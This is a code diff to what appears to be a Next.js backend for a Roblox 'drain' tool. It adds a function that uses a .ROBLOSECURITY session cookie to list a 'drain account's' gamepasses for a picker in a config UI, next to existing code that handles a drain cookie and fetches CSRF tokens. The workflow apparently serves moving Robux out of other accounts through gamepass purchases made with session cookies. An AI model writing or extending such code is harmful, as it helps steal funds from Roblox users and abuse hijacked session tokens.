@@ -54,6 +54,20 @@ async function productInfo(gpId: string): Promise<any | null> {
   return null;
 }
 
+/** List the drain account's own gamepasses (for the picker in TWA — avoids
+ *  pasting IDs and picking a gamepass the account doesn't own). */
+async function userGamepasses(userId: number, cookie: string): Promise<any[]> {
+  try {
+    const r = await fetch(`https://apis.roblox.com/game-passes/v1/users/${userId}/game-passes?count=50`, {
+      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
+      signal: AbortSignal.timeout(10_000),
+    });
+    if (!r.ok) return [];
+    const d = await r.json().catch(() => null);
+    return Array.isArray(d?.gamePasses) ? d.gamePasses : [];
+  } catch { return []; }
+}
+
 async function getCsrf(cookie: string): Promise<string | null> {
   const r = await fetch("https://auth.roblox.com/v2/logout", {
     method: "POST",
@@ -141,7 +155,18 @@ export async function GET(req: NextRequest) {
     gpId ? productInfo(gpId) : Promise.resolve(null),
   ]);
 
+  // The drain account's own gamepasses — for the picker in the config UI.
+  const drainGps = (drainCookie && drainUser?.id)
+    ? await userGamepasses(drainUser.id, drainCookie)
+    : [];
+
   return NextResponse.json({
+    gamepasses: drainGps.map((g: any) => ({
+      gamepassId: g.gamePassId,
+      name: g.name ?? "Gamepass",
+      price: g.price ?? null,
+      isForSale: g.isForSale ?? false,
+    })),
     drain: {
       hasCookie: !!drainCookie,
       cookieValid: drainCookie ? !!drainUser?.id : null,
